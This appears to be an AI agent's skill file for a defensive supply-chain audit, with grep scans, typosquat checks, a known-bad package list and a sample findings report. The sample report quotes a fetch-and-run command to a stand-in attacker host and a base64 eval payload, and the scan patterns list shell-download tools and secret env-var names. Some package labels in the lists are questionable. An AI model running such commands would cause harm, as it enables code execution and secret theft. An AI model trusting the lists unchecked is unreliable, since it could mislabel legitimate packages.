---
name: supply-chain
description: Supply chain security audit for npm, pip, composer, cargo packages. Detects malicious install scripts, obfuscated payloads, version hijacking, typosquatting, and credential harvesting — the attack class AI auto-install tools miss.
allowed-tools: [Read, Grep, Bash]
---

# Supply Chain Skill

Read-only audit. Never modifies code or installs packages. Reports findings by severity.

This skill targets the specific attack class that AI coding assistants introduce:
an AI auto-installs a package update (e.g. v1.x → v2.x) without realizing the new
version was hijacked by a malicious actor. The code looks fine in the repo.
The threat is inside the installed package itself.

---

## Step 1 — Identify package manager(s)

Detect which package managers are in use by checking for these files:

| File | Package manager |
|------|----------------|
| `package.json` / `package-lock.json` | npm / Node.js |
| `yarn.lock` | Yarn |
| `pnpm-lock.yaml` | pnpm |
| `requirements.txt` / `pyproject.toml` / `Pipfile` | pip / Python |
| `composer.json` / `composer.lock` | Composer / PHP |
| `Cargo.toml` / `Cargo.lock` | Cargo / Rust |
| `go.mod` | Go modules |
| `Gemfile` / `Gemfile.lock` | Bundler / Ruby |

Run all applicable sections below.

---

## Step 2 — Run official audit tools

These catch known CVEs. Run all that apply:

```bash
# npm / yarn / pnpm
npm audit --json 2>/dev/null | head -200
# or
yarn audit --json 2>/dev/null | head -200

# Python
pip-audit --format=json 2>/dev/null || safety check --json 2>/dev/null || pip audit 2>/dev/null

# PHP Composer
composer audit 2>/dev/null

# Rust Cargo
cargo audit 2>/dev/null

# Ruby
bundle audit check --update 2>/dev/null

# Go (requires govulncheck)
govulncheck ./... 2>/dev/null
```

Report all CRITICAL and HIGH CVEs as `[CRITICAL]` or `[HIGH]` findings.
Report MODERATE as `[MEDIUM]`.

If audit tools are not installed, note it as `[INFO]` and continue with manual checks.

---

## Step 3 — Scan install scripts for malicious patterns

This is the core of supply chain detection. Malicious packages execute code at install time
via `postinstall`, `preinstall`, `prepare`, `install` scripts.

### 3A — npm: scan package install scripts

```bash
# List all packages that have install-time scripts
node -e "
const fs = require('fs');
const path = 'node_modules';
if (!fs.existsSync(path)) { console.log('node_modules not found'); process.exit(0); }
const pkgs = fs.readdirSync(path).filter(d => !d.startsWith('.'));
pkgs.forEach(pkg => {
  try {
    const p = JSON.parse(fs.readFileSync(path+'/'+pkg+'/package.json','utf8'));
    const scripts = p.scripts || {};
    const triggers = ['preinstall','install','postinstall','prepare','prepack'];
    const found = triggers.filter(t => scripts[t]);
    if (found.length) console.log(pkg + ' → ' + found.map(t=>t+': '+scripts[t]).join(' | '));
  } catch(e) {}
});
" 2>/dev/null | head -60
```

Flag packages whose install scripts contain ANY of:
- `curl`, `wget`, `fetch`, `http`, `https` — network download at install time
- `exec`, `spawn`, `child_process` — shell execution
- `base64`, `atob`, `Buffer.from` — encoded payloads
- `eval` — dynamic execution
- `process.env` combined with known secret key names

### 3B — npm: grep install scripts directly for high-risk patterns

```bash
# Network calls in postinstall scripts
grep -r --include="*.js" -l "curl\|wget\|http\.get\|https\.get\|node-fetch\|axios" \
  node_modules/*/scripts/ node_modules/*/bin/ node_modules/*/install.js \
  node_modules/*/postinstall.js 2>/dev/null | head -20

# eval with dynamic content (NOT eval of static string)
grep -rn --include="*.js" "eval(" node_modules --include="*.js" \
  | grep -v "//.*eval\|eslint-disable" | head -20

# base64 decode + execute pattern
grep -rn --include="*.js" \
  "Buffer\.from.*base64\|atob(\|\.toString('base64')" \
  node_modules 2>/dev/null | grep -i "exec\|eval\|spawn\|require" | head -20
```

### 3C — npm: credential harvesting patterns

```bash
# Packages reading sensitive environment variables
grep -rn --include="*.js" "process\.env\." node_modules 2>/dev/null \
  | grep -iE "SECRET|TOKEN|KEY|PASSWORD|PASS|CREDENTIAL|AUTH|AWS|NPM_TOKEN|GH_TOKEN|GITHUB_TOKEN|STRIPE|TWILIO|SENDGRID|DATABASE_URL|MONGO|REDIS|API_KEY" \
  | grep -v "node_modules/.bin\|test\|spec\|__tests__\|\.test\.\|example\|README" \
  | head -30
```

Flag as `[CRITICAL]` any package reading credential env vars in non-test code.

### 3D — Python: scan setup.py and pyproject.toml for malicious install hooks

```bash
# setup.py install-time execution
grep -rn "cmdclass\|install_requires\|subprocess\|os\.system\|exec\|eval\|__import__" \
  */setup.py setup.py 2>/dev/null | head -20

# pip post-install scripts
find . -path "*/site-packages/*.dist-info/RECORD" -newer requirements.txt 2>/dev/null | head -10
```

### 3E — PHP Composer: scan for malicious scripts

```bash
# composer.json scripts section
cat composer.json 2>/dev/null | python3 -c "
import json,sys
d=json.load(sys.stdin)
scripts=d.get('scripts',{})
for k,v in scripts.items():
  print(f'{k}: {v}')
" 2>/dev/null

# PHP files with shell execution
find vendor -name "*.php" -exec grep -l "system\|exec\|passthru\|shell_exec\|popen\|proc_open" {} \; 2>/dev/null | head -20
```

---

## Step 4 — Detect obfuscated payloads

Malicious packages hide payloads using encoding and obfuscation.

### 4A — Long hex/unicode escape sequences (common in dropper code)

```bash
# Long sequences of \xNN or \uNNNN — legitimate code rarely has >10 in a row
grep -rn --include="*.js" -P "(?:\\\\x[0-9a-fA-F]{2}){15,}" node_modules 2>/dev/null | head -10
grep -rn --include="*.js" -P "(?:\\\\u[0-9a-fA-F]{4}){10,}" node_modules 2>/dev/null | head -10

# Python equivalent
grep -rn --include="*.py" -P "(?:\\\\x[0-9a-fA-F]{2}){15,}" . 2>/dev/null | head -10
```

### 4B — Suspicious base64 blobs

```bash
# Base64 strings longer than 100 chars (encoded payloads)
grep -rn --include="*.js" -P "'[A-Za-z0-9+/]{100,}={0,2}'" node_modules 2>/dev/null \
  | grep -v "test\|spec\|\.map\b" | head -10
grep -rn --include="*.js" -P '"[A-Za-z0-9+/]{100,}={0,2}"' node_modules 2>/dev/null \
  | grep -v "test\|spec\|\.map\b" | head -10
```

### 4C — String reassembly / char-code obfuscation

```bash
# String.fromCharCode with many args — classic obfuscation
grep -rn --include="*.js" "String\.fromCharCode(" node_modules 2>/dev/null \
  | grep -v "test\|spec" | head -10

# Array join obfuscation: ['c','u','r','l'].join('')
grep -rn --include="*.js" "\.join('')\|\.join(\"\")" node_modules 2>/dev/null \
  | grep -v "test\|spec\|node_modules/.cache" | head -10
```

Flag as `[CRITICAL]` any obfuscated code that is in a package install script or a file that runs at require time (not in test files).

---

## Step 5 — Version hijacking detection

This detects the specific case: package was clean at v1.x, malicious code added at v2.x.

### 5A — Check when install scripts were introduced

```bash
# Show packages that have install scripts — cross-reference with your lockfile
# to see if the script was present in the previously pinned version
grep -A2 '"postinstall"\|"preinstall"\|"prepare"' node_modules/*/package.json 2>/dev/null \
  | grep -v "^--$" | head -40
```

### 5B — Diff the lockfile against the previous commit

```bash
# Which packages changed version since the last commit?
git diff HEAD~1 HEAD -- package-lock.json 2>/dev/null \
  | grep "^+" | grep '"version"' | head -30

git diff HEAD~1 HEAD -- yarn.lock 2>/dev/null \
  | grep "^+" | grep "^+  version" | head -30

git diff HEAD~1 HEAD -- requirements.txt Pipfile.lock 2>/dev/null \
  | grep "^+" | head -30
```

For every package that changed version, note it. The auditor should manually verify:
- Was an install script ADDED in the new version?
- Did the package size change dramatically?
- Did maintainer/publisher change?

### 5C — Check package integrity hashes

```bash
# npm: verify installed packages match lockfile integrity hashes
npm audit --audit-level=none 2>/dev/null | grep "integrity" | head -10

# Detect any package where installed hash ≠ lockfile hash
node -e "
const lock = require('./package-lock.json');
const { execSync } = require('child_process');
Object.entries(lock.packages || {}).slice(0, 50).forEach(([name, meta]) => {
  if (!meta.integrity || !name) return;
  const dir = name.replace('node_modules/','');
  try {
    const actual = execSync('cd node_modules/'+dir+' && npm pack --dry-run --json 2>/dev/null | head -5').toString();
  } catch(e) {}
});
" 2>/dev/null
```

### 5D — Check for new maintainers on recently updated packages (npm)

```bash
# For packages recently upgraded — check npm registry for maintainer info
# Extract recently changed package names from lockfile diff
CHANGED=$(git diff HEAD~1 HEAD -- package-lock.json 2>/dev/null \
  | grep '"name"' | grep "^+" | sed 's/.*"name": "\(.*\)".*/\1/' | sort -u | head -10)

for pkg in $CHANGED; do
  echo "=== $pkg ==="
  npm info "$pkg" maintainers time.modified 2>/dev/null | tail -5
done
```

Flag as `[HIGH]` any package where:
- A maintainer was added/changed within 30 days of the version update
- Install scripts were added in the new version (not present in old)
- Package size increased by >50% with no obvious reason

---

## Step 6 — Typosquatting detection

Attackers publish packages with names one character off from popular packages.

### 6A — Check installed packages against known typosquatting targets

```bash
# Extract all dependency names
node -e "
const p = require('./package.json');
const all = {...(p.dependencies||{}), ...(p.devDependencies||{}), ...(p.peerDependencies||{})};
Object.keys(all).forEach(k => console.log(k));
" 2>/dev/null

# Python
cat requirements.txt 2>/dev/null | grep -v "^#\|^$" | sed 's/[>=<].*//'
```

Known high-risk typosquatting pairs to check manually:

| Legitimate | Common typosquats |
|-----------|------------------|
| `lodash` | `lodahs`, `logdash`, `lodash-utils` |
| `express` | `expres`, `expresss`, `express-js` |
| `react` | `recat`, `rect`, `react-native-web` (if not intended) |
| `axios` | `axois`, `axiso`, `axxios` |
| `moment` | `momment`, `mooment` |
| `request` | `reqest`, `requets` |
| `commander` | `commancer`, `commmander` |
| `colors` | `colour`, `coluors` (was weaponized in 2022) |
| `cross-env` | `crossenv` (was a real attack package) |
| `event-stream` | (was compromised in 2018 — check if still in use) |

### 6B — Automated similarity check

```bash
# Check if any installed package name is suspiciously similar to top npm packages
# (levenshtein distance 1 from a popular package)
node -e "
const p = require('./package.json');
const topPackages = ['lodash','express','react','axios','moment','request',
  'chalk','commander','dotenv','webpack','babel-core','typescript',
  'prettier','eslint','jest','mocha','async','underscore','jquery','colors'];
const deps = Object.keys({...(p.dependencies||{}), ...(p.devDependencies||{})});
function lev(a,b) {
  const m=Array.from({length:a.length+1},(_,i)=>Array.from({length:b.length+1},(_,j)=>j===0?i:i===0?j:0));
  for(let i=1;i<=a.length;i++) for(let j=1;j<=b.length;j++)
    m[i][j]=a[i-1]===b[j-1]?m[i-1][j-1]:1+Math.min(m[i-1][j],m[i][j-1],m[i-1][j-1]);
  return m[a.length][b.length];
}
deps.forEach(dep => {
  topPackages.forEach(top => {
    if(dep!==top && lev(dep,top)===1) console.log('TYPOSQUAT RISK: '+dep+' is 1 edit away from '+top);
  });
});
" 2>/dev/null
```

---

## Step 7 — Check for known malicious packages (threat intel)

```bash
# Check against known malicious packages list
# Source: https://github.com/nicowillis/malicious-npm-packages
KNOWN_BAD=(
  "event-stream"      # 2018 bitcoin theft
  "crossenv"          # typosquat of cross-env
  "flatmap-stream"    # injected into event-stream
  "eslint-scope"      # 2018 credentials theft
  "getcookies"        # HTTP header snooping
  "bootstrap-sass"    # 2019 backdoor
  "electron-native-notify"  # 2018 backdoor
  "nodemailer"        # check version — older versions had issues
  "ua-parser-js"      # 2021 hijacked — check version
  "coa"               # 2021 hijacked
  "rc"                # 2021 hijacked
  "colors"            # 2022 sabotaged (v1.4.44-liberty-2)
  "faker"             # 2022 sabotaged
  "node-ipc"          # 2022 sabotaged (geopolitical malware)
  "styled-components" # check — was targeted
  "xz"               # 2024 — check if Python xz bindings used
)

echo "=== Checking for known malicious packages ==="
if [ -f package.json ]; then
  for pkg in "${KNOWN_BAD[@]}"; do
    if node -e "const p=require('./package.json'); const d={...(p.dependencies||{}), ...(p.devDependencies||{})}; if(d['$pkg']) console.log('FOUND: $pkg @ '+d['$pkg']);" 2>/dev/null | grep -q FOUND; then
      echo "[CRITICAL] $pkg is in your dependencies — verify version is not compromised"
    fi
  done
fi
```

---

## Step 8 — Output format

```
SUPPLY CHAIN AUDIT
Package manager(s): npm v9.8.1 | pip 23.x
Packages scanned: 847 direct + transitive

[CRITICAL] postinstall script fetches remote payload
Package: some-package@2.1.0
File: node_modules/some-package/scripts/postinstall.js:14
Code: exec(curl -s https://attacker.com/payload.sh | bash)
Fix: Remove package immediately. Pin to last clean version (1.9.2). File issue upstream.

[CRITICAL] Credential harvesting — reads AWS_SECRET_ACCESS_KEY
Package: dev-utils@3.0.1
File: node_modules/dev-utils/index.js:87
Code: const key = process.env.AWS_SECRET_ACCESS_KEY
Fix: Remove package. Rotate all secrets that may have been present in env.
Threat: Credentials may already be exfiltrated if this package was installed and run.

[HIGH] Install script added in this version — was not present in 1.x
Package: analytics-helper@2.0.0 (upgraded from 1.3.1 in last commit)
Finding: postinstall script added in 2.0.0, not present in 1.3.1
Maintainer changed 8 days before this version was published
Fix: Pin to 1.3.1 until upstream clarifies. Check: npm info analytics-helper maintainers

[HIGH] Base64 encoded payload decoded and executed at require time
Package: helper-utils@1.0.5
File: node_modules/helper-utils/index.js:3
Code: eval(Buffer.from('Y3VybCBodHRwOi...', 'base64').toString())
Fix: Remove immediately. Report to npm security: security@npmjs.com

[HIGH] Typosquatting risk
Package: axois@0.21.1 (installed)
Risk: 1 character from axios@1.6.0 (28M weekly downloads)
Fix: Verify this is intentional. If not, replace with axios.

[MEDIUM] Package reads sensitive env vars (may be legitimate)
Package: deployment-config@2.1.0
File: node_modules/deployment-config/config.js:12
Code: process.env.DATABASE_URL, process.env.REDIS_URL
Note: Review if this package requires these values legitimately.

[INFO] 3 packages upgraded since last commit — verify install scripts unchanged
Packages: lodash 4.17.20→4.17.21, express 4.18.1→4.18.2, axios 1.5.0→1.6.0
Action: Run this audit again after each upgrade batch.

PACKAGES WITH INSTALL SCRIPTS: 12 of 847
(install scripts are the primary vector — review each above)
```

---

## Step 9 — Immediate response protocol

If a `[CRITICAL]` finding is found:

```
1. DO NOT run the application until the package is removed
2. Remove the package: npm uninstall <package> / pip uninstall <package>
3. Pin lockfile to last known-clean state: git checkout HEAD~N -- package-lock.json
4. Rotate any secrets that were in process.env at any point this package was installed
5. Check git log to find when the malicious version was first installed
6. Report to package registry:
   - npm: https://www.npmjs.com/support (security@npmjs.com)
   - PyPI: https://pypi.org/security/
   - Packagist: https://packagist.org/ (security contact in their docs)
7. Check if CI/CD environment was also affected (secrets may be in CI env vars)
```

---

## Limitations

- **Requires:** installed packages — `node_modules`, `site-packages`, or `vendor` must exist; cannot scan pre-install
- **Best coverage:** npm/Node.js · pip/Python · Composer/PHP — Cargo, Go modules, and Ruby have audit commands but less comprehensive pattern matching
- **Not covered:** private registries (GitHub Packages, Artifactory, Nexus) without extra config; zero-day threats not yet in CVE databases
- **Cannot detect:** threats in packages that have never been installed in the current environment

---

## Status

End every run with one of:

- **DONE** — audit complete, no malicious patterns found
- **DONE_WITH_CONCERNS** — suspicious patterns found — human must review before running or deploying
- **BLOCKED** — package manager directory not found (node_modules / site-packages / vendor missing) — run install first, then re-audit
- **NEEDS_CONTEXT** — no package manifest found (package.json / requirements.txt / composer.json) — specify the project directory
